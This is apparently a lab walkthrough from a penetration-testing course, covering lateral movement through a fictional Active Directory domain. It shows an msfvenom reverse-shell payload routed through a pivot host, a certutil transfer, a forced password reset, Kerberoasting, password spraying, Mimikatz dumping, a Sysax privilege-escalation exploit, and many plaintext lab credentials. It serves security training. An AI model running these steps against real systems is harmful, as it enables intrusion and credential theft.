## Lateral Movement

After pillaging the host **DEV01**, we found the following set of credentials by dumping LSA secrets:

Username: hporter
Password: Gr8hambino!

The **Active Directory Enumeration & Attacks** module demonstrates various ways to enumerate AD from a Windows host. Since we've got our hooks deep into **DEV01** we can use it as our staging area for launching further attacks. We'll use the reverse shell that we caught on the **dmz01** host after exploiting **PrintSpoofer** for now since it's rather stable. At a later point, we may want to perform some additional "port forwarding gymnastics" and connect via RDP or WinRM, but this shell should be plenty.


We'll use the [SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) collector to enumerate all possible AD objects and then ingest the data into the BloodHound GUI for review. We can download the executable (though in a real-world assessment, it's best to compile our own tools) and use the handy DNN file manager to upload it to the target. We want to gather as much data as possible and don't have to worry about evasion, so we'll use the **-c All** flag to use all collection methods.

![Sharphound](/Lateral-Movement/images/SharpHound.png) 


This will generate a tidy Zip file that we can download via the DNN file management tool again (so convenient!). Next, we can start the **neo4j service (sudo neo4j start)**, type **bloodhound** to open the GUI tool, and ingest the data.

Searching for our user hporter and selecting **First Degree Object Control**, we can see that the user has **ForceChangePassword** rights over the **ssmalls** user.


![bloodhound](/Lateral-Movement/images/bloodhound.png) 

As an aside, we can see that all Domain Users have RDP access over the DEV01 host. This means that any user in the domain can RDP in and, if they can escalate privileges, could potentially steal sensitive data such as credentials. This is worth noting as a finding; we can call it Excessive Active Directory Group Privileges and label it medium-risk. If the entire group had local admin rights over a host, it would definitely be a high-risk finding.

![RDP](/Lateral-Movement/images/bloodhound-2.png) 


We can use [PowerView](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1) to change the ssmalls user's password. Let's RDP to the target after checking to ensure the port is open. RDP will make it easier for us to interact with the domain via a PowerShell console, though we could still do this via our reverse shell access.


![RDP](/Lateral-Movement/images/rdp.png) 

Next, type powershell to drop into a PowerShell console, and we can use PowerView to change the ssmalls user's password as follows:


![Reset Password](/Lateral-Movement/images/reset-password.png) 

We can switch back to our attack host and confirm that the password was changed successfully. Generally, we would want to avoid this type of activity during a penetration test, but if it's our only path, we should confirm with our client. Most will ask us to proceed so they can see how far the path will take us, but it's always best to ask. We want to, of course, note down any changes like this in our activity log so we can include them in an appendix of our report.

![Login](/Lateral-Movement/images/login-check.png) 


### Remote / Reverse Port Forwarding with SSH 

We have seen local port forwarding, where SSH can listen on our local host and forward a service on the remote host to our port, and dynamic port forwarding, where we can send packets to a remote network via a pivot host. But sometimes, we might want to forward a local service to the remote port as well. Let's consider the scenario where we can RDP into the Windows host **Windows A**. As can be seen in the image below, in our previous case, we could pivot into the Windows host via the Ubuntu server.


![Internal Pivot](/Lateral-Movement/images/internal-pivot.png) 

**But what happens if we try to gain a reverse shell?**

The outgoing connection for the Windows host is only limited to the 172.16.5.0/23 network. This is because the Windows host does not have any direct connection with the network the attack host is on. If we start a Metasploit listener on our attack host and try to get a reverse shell, we won't be able to get a direct connection here because the Windows server doesn't know how to route traffic leaving its network (172.16.5.0/23) to reach the 10.129.x.x (the Academy Lab network).

There are several times during a penetration testing engagement when having just a remote desktop connection is not feasible. You might want to upload/download files (when the RDP clipboard is disabled), use exploits or low-level Windows API using a Meterpreter session to perform enumeration on the Windows host, which is not possible using the built-in [Windows executables](https://lolbas-project.github.io/).

In these cases, we would have to find a pivot host, which is a common connection point between our attack host and the Windows server. In our case, our pivot host would be the Ubuntu server since it can connect to both: our attack host and the Windows target. To gain a Meterpreter shell on Windows, we will create a Meterpreter HTTPS payload using msfvenom, but the configuration of the reverse connection for the payload would be the Ubuntu server's host IP address (172.16.5.129). We will use the port 8080 on the Ubuntu server to forward all of our reverse packets to our attack hosts' 8000 port, where our Metasploit listener is running.


### Creating a Windows Payload with msfvenom

	$ msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe lport=443 -o dev01-shell.exe

![Pivot Payload](/Lateral-Movement/images/pivot-payload.png) 

### Configuring & Starting the multi / handler

![Pivot listener](/Lateral-Movement/images/pivot-listener.png) 

Once our payload is created and we have our listener configured & running, we can copy the payload to the Ubuntu server using the **scp** command since we already have the credentials to connect to the Ubuntu server using SSH.

![Copy Payload](/Lateral-Movement/images/copy-payload.png) 

### Scanning Internal host dev01 (172.16.8.20)

	80/tcp    open     http
	111/tcp   open     sunrpc
	135/tcp   open     epmap
	139/tcp   open     netbios-ssn
	445/tcp   open     microsoft-ds
	2049/tcp  open     nfs
	3389/tcp  open     ms-wbt-server
	5985/tcp  open     unknown
	47001/tcp open     unknown
	49664/tcp open     unknown
	49665/tcp open     unknown
	49666/tcp open     unknown
	49667/tcp open     unknown
	49668/tcp open     unknown
	49669/tcp open     unknown
	49681/tcp open     unknown
	49686/tcp open     unknown
	49687/tcp open     unknown
	49730/tcp open     unknown

SMB, RDP, and WinRM could all be possible attack paths for us on the internal host dev01.


### Setting up SOCKS proxy to interact with internal dev01 host

![Chisel Server](/Lateral-Movement/images/chisel-server.png) 

![Chisel Client](/Lateral-Movement/images/chisel-client.png) 

With our socks proxy set up we can now RDP into host DEV01 as user hporter.

![RDP](/Lateral-Movement/images/rdp-dev01.png) 

And now we can transfer our payload from dmz01 host to dev01 host.

There are many different ways were could transfer our payload but I'm just going to use the built in Windows binary **certutil**. 

![certutil](/Lateral-Movement/images/certutil.png) 


Once we have our payload downloaded on the Windows host, we will use **SSH remote port forwarding** to forward connections from the Ubuntu server's port 443 to our msfconsole's listener service on port 7000. We will use **-vN** argument in our SSH command to make it **verbose and ask it not to prompt the login shell**. The **-R** command asks the Ubuntu server to listen on **<targetIPaddress>:443** and forward all incoming connections on port 443 to our msfconsole listener on **0.0.0.0:7000 of our attack host**.

![Shell execute](/Lateral-Movement/images/shell-execute.png) 

And after execution we get a successful callback and shell!!

![Shell](/Lateral-Movement/images/shell.png) 

### PowerView Command to change a User's password

	$ Set-DomainUserPassword -Identity ssmalls -AccountPassword (ConvertTo-SecureString 'Griffin3' -AsPlainText -Force ) -Verbose





### Share Hunting


Digging around the host and AD some more, we don't see much of anything useful. BloodHound does not show anything interesting for the ssmalls user. Turning back to the Penetration Tester Path content, we remember that both the [Credentialed Enumeration from Windows](https://academy.hackthebox.com/module/143/section/1421) and the [Credentialed Enumeration from Linux](https://academy.hackthebox.com/module/143/section/1269) sections covered hunting file shares with Snaffler and CrackMapExec respectively. There have been many times on penetration tests where I have had to turn to digging through file shares to find a piece of information, such as a password for a service account or similar. I have often been able to access departmental shares (such as IT) with low privileged credentials due to weak NTFS permissions. Sometimes I can even access shares for some or all users in the target company due to the same issue. Frequently users are unaware that their home drive is a mapped network share and not a local folder on their computer, so they may save all sorts of sensitive data there. File share permissions are very difficult to maintain, especially in large organizations. I have found myself digging through file shares often during penetration tests when I am stuck. I can think of one specific pentest where I had user credentials but was otherwise stuck for a few days and resorted to digging through shares. After a while, I found a web.config file that contained valid credentials for an MSSQL service account. This gave me local admin rights on a SQL server where a Domain Admin was logged in, and it was game over. Other times I have found files containing passwords on user drives that have helped me move forward. Depending on the organization and how their file permissions are set up, there can be a lot to wade through and tons of "noise." A tool like Snaffler can help us navigate that and focus on the most important files and scripts. Let's try that here.

First, let's run [Snaffler](https://github.com/SnaffCon/Snaffler) from our RDP session as the hporter user.


This doesn't turn up anything interesting, so let's re-run our share enumeration as the **ssmalls** user. Users can often have different permissions, so share enumeration should be considered an iterative process. To avoid having to RDP again, we can use the **CrackMapExec** [spider_plus](https://mpgn.gitbook.io/crackmapexec/smb-protocol/spidering-shares) module to dig around.


![cme enum](/Lateral-Movement/images/cme-enum.png) 

This creates a file for us in our **/tmp** directory so let's look through it.

![sql-backup](/Lateral-Movement/images/sql-backup.png) 

The file **SQL Express Backup.ps1** in the private IT share looks very interesting. Let's download it using **smbclient**. First, we need to connect.


![smbclient](/Lateral-Movement/images/smbclient.png) 

Checking out the file, we see that it's some sort of backup script with hardcoded credentials for the backupadm, another keyboard walk password. I'm noticing a trend in this organization. Perhaps the same admin set it as the one that set the password we brute-forced with Hydra earlier since this is related to development.

	head -n 16 sql-express-backup.ps1
	$serverName = ".\SQLExpress"
	$backupDirectory = "D:\backupSQL"
	$daysToStoreDailyBackups = 7
	$daysToStoreWeeklyBackups = 28
	$monthsToStoreMonthlyBackups = 3

	[System.Reflection.Assembly]::LoadWithPartialName("Microsoft.SqlServer.SMO") | Out-Null
	[System.Reflection.Assembly]::LoadWithPartialName("Microsoft.SqlServer.SmoExtended") | Out-Null
	[System.Reflection.Assembly]::LoadWithPartialName("Microsoft.SqlServer.ConnectionInfo") | Out-Null
	[System.Reflection.Assembly]::LoadWithPartialName("Microsoft.SqlServer.SmoEnum") | Out-Null
	 
	$mySrvConn = new-object Microsoft.SqlServer.Management.Common.ServerConnection
	$mySrvConn.ServerInstance=$serverName
	$mySrvConn.LoginSecure = $false
	$mySrvConn.Login = "backupadm"
	$mySrvConn.Password = "!qazXSW@"


Before trying to use this account somewhere, let's dig around a bit more. There is an interesting .vbs file on the SYSVOL share, which is accessible to all Domain Users.

	Const cTo = "tss@inlanefreight.local; ITunixsystems@inlanefreight.local, it_noc@inlanefreight.local"	'WHO ARE WE SENDING EMAIL TO
	Const cCC = "tfencl@radial.com"				'WHO TO CC IF ANY
	Const cSMTPServer = "mailhost.inlanefreight.local"	'EMAIL - EXCHANGE SERVER
	Const cFrom = "helpdesk@inlanefreight.local"		'EMAIL - WHO FROM
	Const cSubject = "Active Directory User Management report"	'EMAIL - SUBJECT LINE

	''Most likely not needed, but if needed to pass authorization for connecting and sending emails
	Const cdoUserName = "account@inlanefreight.local"	'EMAIL - USERNAME - IF AUTHENTICATION REQUIRED
	Const cdoPassword = "L337^p@$$w0rD"			'EMAIL - PASSWORD - IF AUTHENTICATION REQUIRED

### Creds

Username: backupadm
Password: !qazXSW@

Username: helpdesk
Password: L337^p@$$w0rD

Username: kdenunez
Password: Welcome1

Username: mmertle
Password: Welcome1

Checking in BloodHound, we do not find a helpdesk user, so this may just be an old password. Based on the year in the script comments, it likely is. We can still add this to our findings regarding sensitive data on file shares and note it down in the credentials section of our project notes. Sometimes we will find old passwords that are still being used for old service accounts that we can use for a password spraying attack.


### Kerberoasting

To cover all our bases, let's check if there are any Kerberoastable users. We can do this via Proxychains using **GetUserSPNs.py or PowerView**. In our RDP session, we'll load PowerView and enumerate Service Principal Name (SPN) accounts.

![Powerview]()

	Get-DomainUser * -SPN | Select samaccountname

	samaccountname
	--------------
	azureconnect
	backupjob
	krbtgt
	mssqlsvc
	sqltest
	sqlqa
	sqldev
	mssqladm
	svc_sql
	sqlprod
	sapsso
	sapvc
	vmwarescvc

There are quite a few. Let's export these to a CSV file for offline processing.

	PS C:\DotNetNuke\Portals\0> Get-DomainUser * -SPN -verbose |  Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_spns.csv -NoTypeInformation

We can download this file via the RDP drive redirection we set up earlier: copy **.\ilfreight_spns.csv \\Tsclient\Home**. Open up the .csv file using LibreOffice Calc or Excel and pull out the hashes and add them to a file. We can now run them through Hashcat to see if we can crack any and, if so, if they are for privileged accounts.


![Hashcat](/Lateral-Movement/images/hashcat.png) 


### Password Spraying

Another lateral movement technique worth exploring is Password Spraying. We can use [DomainPasswordSpray.ps1](https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/DomainPasswordSpray.ps1) or the Windows version of Kerbrute from the DEV01 host or use Kerbrute from our attack host via Proxychains (all worth playing around with).

![Password Spray](/Lateral-Movement/images/pass-spray.png) 

We find a valid password for two more users, but neither has interesting access. It's still worth noting down a finding for Weak Active Directory Passwords allowed and moving on.


### Misc Techniques

Let's try a few more things to cover all our bases. We can search the SYSVOL share for Registry.xml files that may contain passwords for users configured with autologon via Group Policy.


![Autologin](/Lateral-Movement/images/autologin.png) 

This doesn't turn up anything useful. Moving on, we can search for passwords in user Description fields in AD, which is not overly common, but we still see it from time to time (I have even seen Domain and Enterprise Admin account passwords here!).

	PS C:\Users\hporter\Documents> Get-DomainUser * | select samaccountname,description | ?{$_.Description -ne $null}

	samaccountname description
	-------------- -----------
	Administrator  Built-in account for administering the computer/domain
	frontdesk      ILFreightLobby!
	Guest          Built-in account for guest access to the computer/d...
	krbtgt         Key Distribution Center Service Account
	
![AD Description](/Lateral-Movement/images/desciption.png)

Username: frontdesk
Password: ILFreightLobby!

We find one for the account frontdesk, but this one isn't useful either. It's worth noting that there are many multiple ways to obtain a user account password in this domain, and there is the one host with RDP privileges granted to all Domain Users. Though these accounts do not have any special rights, it would be a client fixing these issues because an attacker often only needs one password to be successful in AD. Here we can note down a finding for Passwords in AD User Description Field and continue onwards.


### Next Steps

At this point, we have dug into the domain pretty heavily and have found several sets of credentials but hit a bit of a brick wall. Going back to the basics, we can run a scan to see if any hosts have WinRM enabled and attempt to connect with each set of credentials.

![MS01 Nmap](/Lateral-Movement/images/ms01-nmap.png) 


The host 172.16.8.50, or MS01 is the only one left that we haven't gotten into aside from the Domain Controller, so let's give it a try using evil-winrm and the credentials for the backupadm user.

It works, and we're in!

![Evil WinRM](/Lateral-Movement/images/evil-winrm.png)

At this point, we could use this evil-winrm shell to further enumerate the domain with a tool such as PowerView. Keep in mind that we'll need to use a PSCredential object to perform enumeration from this shell due to the Kerberos "Double Hop" problem. Practice this technique and see what other AD enumeration tools you may be able to use in this way.

Back to the task at hand. Our user is not a local admin, and whoami /priv does not turn up any useful privileges. Looking through the Windows Privilege Escalation module, we don't find much interesting so let's hunt for credentials. After some digging around, we find an unattend.xml file leftover from a previous installation.

Username: ilfserveradm
Password: Sys26Admin

We find credentials for the local user ilfserveradm, with the password Sys26Admin.


This isn't a domain user, but it's interesting that this user has Remote Desktop access but is not a member of the local admins group. Let's RDP in and see what we can do. After RDPing in and performing additional enumeration, we find some non-standard software installed in the C:\Program Files (x86)\SysaxAutomation directory. A quick search yields [this](https://www.exploit-db.com/exploits/50834) local privilege escalation exploit. According to the write-up, this Sysax Scheduled Service runs as the local SYSTEM account and allows users to create and run backup jobs. If the option to run as a user is removed, it will default to running the task as the SYSTEM account. Let's test it out!

First, create a file called pwn.bat in C:\Users\ilfserveradm\Documents containing the line net localgroup administrators ilfserveradm /add to add our user to the local admins group (sometime we'd need to clean up and note down in our report appendices). Next, we can perform the following steps:

> - Open C:\Program Files (x86)\SysaxAutomation\sysaxschedscp.exe
> - Select Setup Scheduled/Triggered Tasks
> - Add task (Triggered)
> - Update folder to monitor to be C:\Users\ilfserveradm\Documents
> - Check Run task if a file is added to the monitor folder or subfolder(s)
> - Choose Run any other Program and choose C:\Users\ilfserveradm\Documents\pwn.bat 
> - Uncheck Login as the following user to run task
> - Click Finish and then Save

Finally, to trigger the task, create a new .txt file in the C:\Users\ilfserveradm\Documents directory. We can check and see that the ilfserveradm user was added to the Administrators group.

![](/Lateral-Movement/images/priv-esc.png) 


### Post-Exploitation / Pillaging

Next, we'll perform some post-exploitation on the MS01 host. We do see a couple of interesting files in the root of the c:\ drive named budget_data.xlsx and Inlanefreight.kdbx that would be worth looking into and potentially reporting to the client if they are not in their intended location. Next, we can use Mimikatz, elevate to an NT AUTHORITY\SYSTEM token and dump LSA secrets.

![mimikatz](/Lateral-Movement/images/mimikatz.png) 

We find a set password but no associated username. This appears to be for an account configured with autologon, so we can query the Registry to find the username.

	PS C:\Users\ilfserveradm> Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\'


	AutoRestartShell             : 1
	Background                   : 0 0 0
	CachedLogonsCount            : 10
	DebugServerCommand           : no
	DisableBackButton            : 1
	EnableSIHostIntegration      : 1
	ForceUnlockLogon             : 0
	LegalNoticeCaption           :
	LegalNoticeText              :
	PasswordExpiryWarning        : 5
	PowerdownAfterShutdown       : 0
	PreCreateKnownFolders        : {A520A1A4-1780-4FF6-BD18-167343C5AF16}
	ReportBootOk                 : 1
	Shell                        : explorer.exe
	ShellCritical                : 0
	ShellInfrastructure          : sihost.exe
	SiHostCritical               : 0
	SiHostReadyTimeOut           : 0
	SiHostRestartCountLimit      : 0
	SiHostRestartTimeGap         : 0
	Userinit                     : C:\Windows\system32\userinit.exe,
	VMApplet                     : SystemPropertiesPerformance.exe /pagefile
	WinStationsDisabled          : 0
	scremoveoption               : 0
	DisableCAD                   : 1
	LastLogOffEndTimePerfCounter : 1987207413
	ShutdownFlags                : 19
	AutoAdminLogon               : 1
	DefaultDomainName            : INLANEFREIGHT
	DefaultUserName              : mssqladm
	LastUsedUsername             : mssqladm
	PSPath                       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
		                          NT\CurrentVersion\Winlogon\
	PSParentPath                 : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
		                          NT\CurrentVersion
	PSChildName                  : Winlogon
	PSDrive                      : HKLM
	PSProvider                   : Microsoft.PowerShell.Core\Registry
	
![reg query](/Lateral-Movement/images/reg-query.png) 

Now we have a new credential pair: mssqladm:DBAilfreight1!.


